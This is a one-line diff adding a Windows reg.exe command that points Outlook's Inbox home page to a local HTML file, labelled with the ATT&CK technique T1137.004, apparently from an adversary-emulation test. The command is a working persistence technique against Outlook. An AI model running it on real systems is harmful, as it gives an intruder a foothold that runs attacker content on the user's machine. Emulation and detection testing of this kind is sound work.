@@ -1,0 +1,1 @@
+reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f
